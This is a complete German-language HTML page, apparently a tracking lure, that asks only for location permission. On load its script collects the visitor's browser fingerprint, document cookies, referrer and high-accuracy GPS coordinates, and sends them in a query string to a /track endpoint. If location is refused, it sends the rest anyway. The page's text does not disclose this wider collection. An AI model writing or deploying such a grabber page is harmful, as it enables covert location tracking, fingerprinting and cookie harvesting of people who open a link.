<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Willkommen</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;padding:24px}
    .ok{color:green}.err{color:#b00}
  </style>
</head>
<body>
  <h1>Willkommen</h1>
  <p>Bitte erlaube den Zugriff auf deinen Standort.</p>
  <div id="status">Sammle Daten…</div>

  <script>
    async function getGeoPermission() {
      try {
        if (!navigator.permissions) return 'unbekannt';
        const s = await navigator.permissions.query({ name: 'geolocation' });
        return s.state; // 'granted' | 'denied' | 'prompt'
      } catch { return 'unbekannt'; }
    }

    function collectData(geoStatus) {
      return {
        request_id: (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now()),
        lat: null,
        lon: null,
        accuracy: null,
        geo_status: geoStatus || 'unbekannt',
        userAgent: navigator.userAgent || '',
        language: navigator.language || '',
        languages: JSON.stringify(navigator.languages || []),
        cookies: document.cookie || '',
        screen: JSON.stringify({
          width: window.screen?.width,
          height: window.screen?.height,
          colorDepth: window.screen?.colorDepth
        }),
        window: JSON.stringify({
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight
        }),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        platform: navigator.platform || '',
        hardwareConcurrency: navigator.hardwareConcurrency ?? '',
        deviceMemory: navigator.deviceMemory ?? '',
        connection: JSON.stringify(navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : {}),
        referrer: document.referrer || '',
        timestamp: new Date().toISOString()
      };
    }

    function sendData(data) {
      const qs = new URLSearchParams(data).toString();
      return fetch(`/track?${qs}`);
    }

    (async function run(){
      const geoStatus = await getGeoPermission();
      const data = collectData(geoStatus);

      const done = () => {
        const s = document.getElementById('status');
        s.textContent = '✅ Daten wurden an den Server gesendet.';
        s.className = 'ok';
      };
      const fail = (err) => {
        console.error(err);
        const s = document.getElementById('status');
        s.textContent = '❌ Senden fehlgeschlagen.';
        s.className = 'err';
      };

      // Nur echte Browser-GPS nutzen (keine IP-Fallbacks)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            if (typeof pos.coords.accuracy === 'number') data.accuracy = pos.coords.accuracy;
            sendData(data).then(done).catch(fail);
          },
          () => { // verweigert/Fehler -> ohne Location senden
            sendData(data).then(done).catch(fail);
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      } else {
        sendData(data).then(done).catch(fail);
      }
    })();
  </script>
</body>
</html>

